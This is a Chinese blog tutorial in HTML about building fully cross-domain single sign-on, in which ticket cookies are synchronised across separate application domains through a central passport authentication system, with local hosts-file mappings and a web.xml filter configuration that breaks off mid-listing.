完全跨域的单点登录实现方案基本和上篇文章介绍的一样，只不过生成ticket的过程更复杂些。上篇文章中的项目是不能完全跨域的，由于多个应用系统以及认证系统域不同，也没有共同的父域，导致登录后，认证系统向浏览器写的ticket在其它应用系统中获取不到，这时访问其它应用系统时，没有携带着ticket的cookie，无法认证也无法单点登录。那解决的方案是每个应用系统都向浏览器cookie中写入ticket，请看下图，图中浅蓝色圆角区域代表不同的域，当用户通过浏览器第一次访问应用系统1时，由于还没有登录，会被引导到认证系统进行登录。下面开始单点登录的过程：<span style="color:rgb(51,51,255)">认证系统根据用户在浏览器中输入的登录信息，进行身份认证，如果认证通过，返回给浏览器一个证明[认证系统_ticket]；这时再通过浏览器将[认证系统_ticket]发送到到应用系统1的设置cookie的url，应用系统1返回给浏览器一个证明[应用系统1_ticket]，这时再将请求重定向到最初访问的页面，以后应用系统1就可以自动登录了。现在用户访问了应用系统2，由于应用系统2没有生成过cookie（但是用户已经在应用系统1登录过一次了），将请求重定向到认证系统；认证系统检测到已经生成过[认证系统_ticket]了，认证通过；再通过浏览器将[认证系统_ticket]发送到到应用系统2的设置cookie的url，应用系统2返回给浏览器一个证明[应用系统2_ticket]，这时再将请求重定向到最初访问的页面。应用系统3也同样原理，我们等于将ticket做了一次同步，保证了每个应用系统都有一份认证系统产生的ticket。剩余的ticket验证过程和上篇文章一样了。</span><img src="http://img.blog.csdn.net/20140305150846046?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="" style="border:none; max-width:602px; height:auto" /></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       ticket同步的过程用jsonp应该也可以实现，我基于上篇文章中的项目实现了完全跨域的单点登录，可以在<a target="_blank" href="http://download.csdn.net/detail/ghsau/6995969" style="text-decoration:none; color:rgb(12,137,207)">这里</a>下载项目。</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>域名准备</strong></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>       </strong>修改hosts文件，映射3个域名：</p>&#13;
<div class="dp-highlighter bg_html" style="font-family:Consolas,'Courier New',Courier,mono,serif; width:938.516px; overflow:hidden; padding-top:1px; border-color:rgb(204,204,204); color:rgb(85,85,85); line-height:35px; margin:18px 0px!important; background-color:rgb(231,229,220)">&#13;
<div class="bar" style="padding-left:45px">&#13;
<div class="tools" style="padding:3px 8px 10px 10px; font-size:9px; line-height:normal; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; color:silver; border-left-width:3px; border-left-style:solid; border-left-color:rgb(153,153,153); background-color:rgb(248,248,248)">&#13;
<strong>[html]</strong> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20545513" class="ViewSource" title="view plain" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">view&#13;
 plain</a><span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20545513" class="CopyToClipboard" title="copy" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">copy</a></span>&#13;
<div style="position:absolute; left:476px; top:2130px; width:27px; height:15px; z-index:99">&#13;
</div>&#13;
<span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20545513" class="PrintSource" title="print" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">print</a></span><a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20545513" class="About" title="?" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">?</a><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/218843" title="在CODE上查看代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/CODE_ico.png" width="12" height="12" alt="在CODE上查看代码片" style="border:none; position:relative; top:1px; left:2px" /></a></span><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/218843/fork" title="派生到我的代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/ico_fork.svg" width="12" height="12" alt="派生到我的代码片" style="border:none; position:relative; top:2px; left:2px" /></a></span></div>&#13;
</div>&#13;
<ol start="1" class="dp-xml" style="padding:0px; border:none; color:rgb(92,92,92); margin:0px 0px 1px 45px!important; background-color:rgb(255,255,255)">&#13;
<li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span style="margin:0px; padding:0px; border:none; background-color:inherit">127.0.0.1 web1.com  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">127.0.0.1 web2.com  </span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">127.0.0.1 passport.com  </span></li></ol>&#13;
</div>&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">       三个域名都是独立的，没有共同父域，web1和web2用于访问应用系统，passport用于访问认证系统。</span>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>项目部署</strong></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>       </strong>项目中包含的是两个Eclipse Project，导入到Eclipse/MyEclipse后，可能需要设置下JavaEE类库。WebSSOAuth为认证系统，WebSSODemo为应用系统，如果映射的域名和我设置的一样，不需要设置，直接部署即可。如果不一样，需要修改下WebSSODemo/WEB-INF/web.xml文件。关键配置信息如下：</p>&#13;
<div class="dp-highlighter bg_html" style="font-family:Consolas,'Courier New',Courier,mono,serif; width:938.516px; overflow:hidden; padding-top:1px; border-color:rgb(204,204,204); color:rgb(85,85,85); line-height:35px; margin:18px 0px!important; background-color:rgb(231,229,220)">&#13;
<div class="bar" style="padding-left:45px">&#13;
<div class="tools" style="padding:3px 8px 10px 10px; font-size:9px; line-height:normal; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; color:silver; border-left-width:3px; border-left-style:solid; border-left-color:rgb(153,153,153); background-color:rgb(248,248,248)">&#13;
<strong>[html]</strong> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20545513" class="ViewSource" title="view plain" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">view&#13;
 plain</a><span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20545513" class="CopyToClipboard" title="copy" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">copy</a></span>&#13;
<div style="position:absolute; left:476px; top:2425px; width:27px; height:15px; z-index:99">&#13;
</div>&#13;
<span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20545513" class="PrintSource" title="print" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">print</a></span><a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20545513" class="About" title="?" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">?</a><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/218843" title="在CODE上查看代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/CODE_ico.png" width="12" height="12" alt="在CODE上查看代码片" style="border:none; position:relative; top:1px; left:2px" /></a></span><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/218843/fork" title="派生到我的代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/ico_fork.svg" width="12" height="12" alt="派生到我的代码片" style="border:none; position:relative; top:2px; left:2px" /></a></span></div>&#13;
</div>&#13;
<ol start="1" class="dp-xml" style="padding:0px; border:none; color:rgb(92,92,92); margin:0px 0px 1px 45px!important; background-color:rgb(255,255,255)">&#13;
<li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-class</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">com.ghsau.filter.SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-class</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="comments" style="margin:0px; padding:0px; border:none; color:rgb(0,130,0); background-color:inherit">&lt;!-- 认证系统服务 --&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOService</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">http://passport.com:8080/WebSSOAuth/SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="comments" style="margin:0px; padding:0px; border:none; color:rgb(0,130,0); background-color:inherit">&lt;!-- 认证系统ticket名称 --&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">cookieName</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOID</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-mapping</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">url-pattern</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">*.jsp</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">url-pattern</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-mapping</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-mapping</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">url-pattern</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">/logout</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">url-pattern</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-mapping</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">filter-mapping</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
